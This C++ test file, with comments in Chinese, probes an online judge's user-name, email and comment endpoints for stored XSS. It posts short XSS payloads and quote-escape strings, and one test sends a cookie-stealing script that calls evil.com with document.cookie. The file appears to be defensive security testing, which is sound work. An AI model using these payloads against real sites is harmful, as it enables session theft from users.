#include "comm.hpp"

void TestNormalName(const std::string& session) {
    TEST("验证-正常名字");
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"TestUser"})", session);
    LOG("  POST 响应: " + resp);
    RESULT(resp.find("success") != std::string::npos);
}

// payload 都在 20 字节内
void TestShortXSS1(const std::string& session) {
    TEST("XSS-短pay1: <svg onload=1>");
    // 16 bytes, 如果只检查长度不检查字符，会注入成功
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"<svg onload=1>"})", session);
    LOG("  POST 响应: " + resp);
    bool blocked = resp.find("INVALID_NAME") != std::string::npos;
    RESULT(blocked);
    std::cout << "  " << (blocked ? "字符被拦截" : "若success则XSS漏洞存在") << std::endl;
}

void TestShortXSS2(const std::string& session) {
    TEST("XSS-短pay2: <img src=x on>a");
    // 17 bytes, 触发onerror/onload事件
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"<img src=x on>a"})", session);
    LOG("  POST 响应: " + resp);
    RESULT(resp.find("INVALID_NAME") != std::string::npos);
}

void TestShortXSS3(const std::string& session) {
    TEST("XSS-短pay3: </script><a>");
    // 15 bytes, 尝试闭合script标签
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"</script><a>"})", session);
    LOG("  POST 响应: " + resp);
    RESULT(resp.find("INVALID_NAME") != std::string::npos);
}

void TestShortXSS4(const std::string& session) {
    TEST("XSS-短pay4: <a href=1>x");
    // 14 bytes, 纯HTML标签注入
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"<a href=1>x"})", session);
    LOG("  POST 响应: " + resp);
    // 这个如果通过需要在前端验证是否被escapeHtml转义
    bool ok = resp.find("success") != std::string::npos;
    if (ok) LOG("  ⚠️ HTML注入成功，需验证前端escapeHtml是否防护");
    RESULT(resp.find("INVALID_NAME") != std::string::npos);
}

void TestEmailXSS(const std::string& session) {
    TEST("XSS-邮箱注入");
    // 邮箱最长50字节，email字段在oj_server.cpp:134同样未转义注入script
    std::string resp = HttpPostJson(BASE + "/api/user/email/change",
        R"({"new_email":"<script>alert(1)</script>"})", session);
    LOG("  POST 响应: " + resp);
    RESULT(resp.find("success") == std::string::npos);
}

void TestCommentXSS(const std::string& session) {
    TEST("XSS-评论注入");
    std::string resp = HttpPostJson(BASE + "/api/solutions/11/comments",
        R"({"content":"<svg onload=alert(1)>XSS"})", session);
    LOG("  POST 响应: " + resp);
    bool blocked = resp.find("UNAUTHORIZED") != std::string::npos ||
                   resp.find("SOLUTION_NOT_FOUND") != std::string::npos ||
                   resp.find("success") != std::string::npos;
    if (resp.find("success") != std::string::npos) {
        LOG("  ⚠️ 评论提交成功，检查前端渲染是否转义");
    }
    RESULT(blocked);
}

void TestDoubleQuote(const std::string& session) {
    TEST("XSS-双引号逃逸: \";1");
    // 5 bytes, 最简JS逃逸payload
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"\";1"})", session);
    LOG("  POST 响应: " + resp);
    bool stored = resp.find("success") != std::string::npos;
    if (stored) {
        LOG("  🔴 双引号已存入数据库，打开首页检查是否JS报错");
    } else {
        LOG("  ✅ 服务端拒绝了双引号字符");
    }
}
void TestSingleQuote(const std::string& session) {
    TEST("XSS-单引号逃逸: ';1");
    // 4 bytes
    std::string resp = HttpPostJson(BASE + "/api/user/name",
        R"({"name":"';1"})", session);
    LOG("  POST 响应: " + resp);
}

void TestCookieTheftXSS(const std::string& session) {
    TEST("XSS-Cookie窃取");
    std::string resp = HttpPostJson(BASE + "/api/solutions/11/comments",
        R"({"name":"</script><script>fetch('http://evil.com/?c='+document.cookie)</script>"})",
        session);
    LOG("  POST 响应: " + resp);
    RESULT(resp.find("INVALID_NAME") != std::string::npos);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);
    TestCookieTheftXSS(session_id);
    curl_global_cleanup();
}
